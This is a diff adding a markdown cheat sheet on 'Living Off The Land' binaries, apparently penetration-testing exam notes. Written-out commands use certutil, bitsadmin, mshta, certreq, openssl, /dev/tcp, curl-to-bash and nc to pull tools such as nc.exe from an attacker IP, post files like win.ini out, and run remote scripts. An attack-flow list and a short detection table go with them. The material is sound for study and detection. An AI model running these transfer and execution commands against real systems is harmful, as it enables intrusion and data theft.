@@ -291,3 +291,234 @@ Use LOTL when:
     
 - Know 3+ alternatives per function
 ---
+
+# 🧠 Living Off The Land (LOLBins) – Exam & Field Cheat Sheet
+
+---
+
+## 📌 Definition
+
+**Living Off The Land (LotL)** = Using legitimate, built-in system binaries to:
+
+- Download files
+    
+- Upload files
+    
+- Execute commands
+    
+- Read/Write files
+    
+- Bypass controls
+    
+
+Coined at DerbyCon 3 by:
+
+- Christopher Campbell (@obscuresec)
+    
+- Matt Graeber (@mattifestation)
+    
+
+---
+
+## 🔎 Reference Projects
+
+- Windows: **LOLBAS Project**
+    
+- Linux: **GTFOBins**
+    
+
+---
+
+# 🪟 WINDOWS LOLBINS
+
+## 🔥 Common Download Methods
+
+|Binary|Function|Example|
+|---|---|---|
+|certutil.exe|Download|`certutil -urlcache -split -f http://IP/file.exe`|
+|bitsadmin|Download|`bitsadmin /transfer job http://IP/file.exe C:\Temp\file.exe`|
+|PowerShell|Download|`Invoke-WebRequest`|
+|certreq.exe|Upload (POST)|`certreq -Post -config http://IP:8000 file.txt`|
+|mshta.exe|Execute remote script|`mshta http://IP/script.hta`|
+
+---
+
+## 🧨 Certutil (Defacto wget for Windows)
+
+```cmd
+certutil -urlcache -split -f http://10.10.10.32/nc.exe
+```
+
+⚠ Often detected by AMSI.
+
+---
+
+## 📦 BITS Download
+
+```powershell
+Start-BitsTransfer -Source http://10.10.10.32/nc.exe -Destination C:\Temp\nc.exe
+```
+
+Stealthy:
+
+- Uses background service
+    
+- Can survive reboot
+    
+
+---
+
+## 📤 Certreq Upload (POST)
+
+```cmd
+certreq.exe -Post -config http://IP:8000/ C:\Windows\win.ini
+```
+
+Triggers:
+
+```id="2xrk10"
+POST requests
+```
+
+---
+
+# 🐧 LINUX (GTFOBins)
+
+## 🔥 Common File Transfer Binaries
+
+|Binary|Function|Example|
+|---|---|---|
+|curl|Download|`curl -O http://IP/file.sh`|
+|wget|Download|`wget http://IP/file.sh`|
+|openssl|Encrypted transfer|`openssl s_client`|
+|bash|/dev/tcp transfer|`/dev/tcp/IP/PORT`|
+|nc|Raw transfer|`nc IP 4444`|
+|scp|Secure transfer|`scp file user@IP:/tmp/`|
+
+---
+
+## 🔐 OpenSSL "NC Style" Transfer
+
+### On attacker:
+
+```bash
+openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < file.sh
+```
+
+### On victim:
+
+```bash
+openssl s_client -connect IP:80 -quiet > file.sh
+```
+
+Encrypted channel.
+
+---
+
+## 🧬 Bash TCP Transfer (No Netcat Required)
+
+```bash
+cat file > /dev/tcp/IP/4444
+```
+
+Receive:
+
+```bash
+cat < /dev/tcp/IP/4444 > file
+```
+
+Works if Bash compiled with net redirection.
+
+---
+
+# 🛠 Common LOL Techniques
+
+|Goal|Windows Tool|Linux Tool|
+|---|---|---|
+|Download|certutil|curl|
+|Upload|certreq|curl -X POST|
+|Encrypted transfer|WinRM / PowerShell|openssl|
+|Execute remote script|mshta|curl \| bash|
+|File exfil|bitsadmin|nc|
+
+---
+
+# 🛡 Why LOLBins Work
+
+- Signed Microsoft binaries
+    
+- Already whitelisted
+    
+- Trusted by AV
+    
+- Often allowed through firewall
+    
+- Blend with normal traffic
+    
+
+---
+
+# 🔎 Detection Indicators
+
+|Indicator|Meaning|
+|---|---|
+|Certutil reaching external IP|Suspicious download|
+|BITS running from user shell|Possible exfil|
+|mshta launching HTTP URL|Remote code execution|
+|Unusual PowerShell parent process|Possible abuse|
+|Rare User-Agent string|Tool misuse|
+
+---
+
+# 🧠 Attack Flow Concept
+
+![Image](https://i.sstatic.net/PAeem.png)
+
+![Image](https://www.cyberciti.biz/media/new/faq/2011/10/How-to-download-a-file-using-curl-and-bash-for-loop.png)
+
+![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/1%2AeCJpcMK5miEWHOAF2Puxfg.png)
+
+![Image](https://media.licdn.com/dms/image/v2/D4E12AQEmfv617PF9CA/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1729833010401?e=2147483647&t=KGhB3z_RGfowSmZvd7r_9e4o1xnFg7SBEddM8GO7ydc&v=beta)
+
+1. Attacker gets shell
+    
+2. Uses built-in binary
+    
+3. Transfers tool
+    
+4. Executes payload
+    
+5. Blends into normal activity
+    
+
+---
+
+# 🎯 Exam Key Points
+
+✔ LOLBins = legitimate binaries abused  
+✔ Harder to detect than custom malware  
+✔ Leave logs & network artifacts  
+✔ Whitelisting > Blacklisting  
+✔ HTTP/S most common channel  
+✔ Encrypted transport preferred
+
+---
+
+# 🚀 Extra Practice
+
+Search LOLBAS & GTFOBins for:
+
+- obscure binaries
+    
+- file write functions
+    
+- command execution methods
+    
+- environment variable abuse
+    
+- proxy bypass tricks
+    
+
+The more obscure, the better.
+
+---
